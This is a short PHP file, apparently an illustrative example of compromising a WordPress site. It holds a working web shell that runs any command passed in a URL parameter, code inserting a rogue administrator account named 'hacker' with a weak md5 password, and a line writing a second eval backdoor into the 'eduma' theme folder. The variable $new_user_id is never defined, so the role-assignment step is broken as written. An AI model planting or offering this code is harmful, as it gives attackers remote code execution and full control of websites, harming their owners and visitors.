<?php
// This is a "web shell" - allows remote command execution

if (isset($_GET['cmd'])) {
    // Execute any system command
    system($_GET['cmd']);
}

// Or create an admin user
$wpdb->insert('wp_users', array(
    'user_login' => 'hacker',
    'user_pass' => md5('password123'),
    'user_email' => 'hacker@evil.com'
));

// Add user to admin role
$wpdb->insert('wp_usermeta', array(
    'user_id' => $new_user_id,
    'meta_key' => 'wp_capabilities',
    'meta_value' => 'a:1:{s:13:"administrator";b:1;}'
));

// Upload more malware
file_put_contents('wp-content/themes/eduma/evil.php', '<?php eval($_POST["code"]); ?>');
?>
